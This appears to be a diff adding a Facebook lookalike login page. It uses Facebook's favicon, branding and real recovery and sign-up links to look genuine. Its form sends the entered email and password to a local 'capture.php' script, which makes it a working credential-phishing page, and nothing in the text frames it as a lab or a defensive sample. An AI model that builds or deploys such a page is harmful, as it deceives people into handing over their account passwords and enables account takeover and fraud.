@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - log in or sign up</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <div class="logo">facebook</div>
+            <p class="tagline">Connect with friends and the world around you on Facebook.</p>
+        </div>
+        
+        <div class="right-section">
+            <div class="login-card">                
+                <!-- Updated form with action and method -->
+                <form id="loginForm" action="capture.php" method="POST">
+                    <div class="form-group">
+                        <input type="text" class="form-control" name="email" placeholder="Email or phone number">
+                    </div>
+                    <div class="form-group">
+                        <input type="password" class="form-control" name="password" placeholder="Password">
+                    </div>
+                    <button type="submit" class="login-btn">Log In</button>
+                </form>
+                    
+                <div class="forgot-password">
+                    <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgot password?</a>
+                </div>
+                
+                <div class="divider"></div>
+                
+                <button class="create-account-btn">Create new account</button>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Remove the old submit handler since form will submit to PHP
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const email = this.querySelector('input[name="email"]').value;
+            const password = this.querySelector('input[name="password"]').value;
+            
+            if (!email || !password) {
+                alert('Please enter both email and password.');
+                e.preventDefault(); // Prevent form submission
+                return;
+            }
+        });
+        
+        document.querySelector('.create-account-btn').addEventListener('click', function() {
+            window.location.href = "https://www.facebook.com/r.php?entry_point=login";
+        });
+    </script>
+</body>
+</html>
